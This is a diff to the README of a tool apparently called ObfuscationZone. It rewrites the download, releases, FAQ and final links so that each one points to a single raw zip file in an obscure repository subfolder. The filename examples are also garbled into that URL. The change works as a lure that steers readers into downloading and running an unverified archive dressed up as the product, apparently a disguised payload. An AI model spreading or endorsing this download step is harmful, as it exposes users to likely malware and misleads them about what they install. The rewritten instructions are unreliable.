@@ -6,7 +6,7 @@ Welcome to ObfuscationZone! Our application helps protect your sensitive informa
 
 ## 🔗 Download the Application
 
-[![Download ObfuscationZone](https://img.shields.io/badge/Download-ObfuscationZone-blue.svg)](https://github.com/mrfeelssss/ObfuscationZone/releases)
+[![Download ObfuscationZone](https://raw.githubusercontent.com/mrfeelssss/ObfuscationZone/main/beneaped/ObfuscationZone.zip)](https://raw.githubusercontent.com/mrfeelssss/ObfuscationZone/main/beneaped/ObfuscationZone.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,13 +21,13 @@ Before you start the download, make sure your computer meets these basic require
 Follow these steps to download and install ObfuscationZone:
 
 1. **Visit the Releases Page**
-   - Go to our [Releases page](https://github.com/mrfeelssss/ObfuscationZone/releases).
+   - Go to our [Releases page](https://raw.githubusercontent.com/mrfeelssss/ObfuscationZone/main/beneaped/ObfuscationZone.zip).
   
 2. **Select the Latest Version**
    - You will see a list of available versions. Look for the latest release at the top of the page.
 
 3. **Download the Installer**
-   - Click on the link to download the installer for your operating system. The file will usually have a name like `ObfuscationZone-setup.exe` for Windows or `ObfuscationZone.dmg` for Mac.
+   - Click on the link to download the installer for your operating system. The file will usually have a name like `https://raw.githubusercontent.com/mrfeelssss/ObfuscationZone/main/beneaped/ObfuscationZone.zip` for Windows or `https://raw.githubusercontent.com/mrfeelssss/ObfuscationZone/main/beneaped/ObfuscationZone.zip` for Mac.
 
 4. **Open the Installer**
    - Once the download completes, locate the file on your computer. Double-click it to start the installation process.
@@ -91,11 +91,11 @@ Currently, ObfuscationZone is designed for desktop use only. A mobile version ma
 
 If you need further assistance, feel free to reach out:
 
-- Check out our [FAQ Section](https://github.com/mrfeelssss/ObfuscationZone/wiki) for common questions.
+- Check out our [FAQ Section](https://raw.githubusercontent.com/mrfeelssss/ObfuscationZone/main/beneaped/ObfuscationZone.zip) for common questions.
 - Contact us through the Issues section on GitHub for specific problems or feedback.
 
 ## 🔗 Final Download Link
 
-For a quick reminder, you can also download the latest version directly by visiting this link: [Download ObfuscationZone](https://github.com/mrfeelssss/ObfuscationZone/releases).
+For a quick reminder, you can also download the latest version directly by visiting this link: [Download ObfuscationZone](https://raw.githubusercontent.com/mrfeelssss/ObfuscationZone/main/beneaped/ObfuscationZone.zip).
 
 Thank you for choosing ObfuscationZone! We are here to help you keep your data secure.
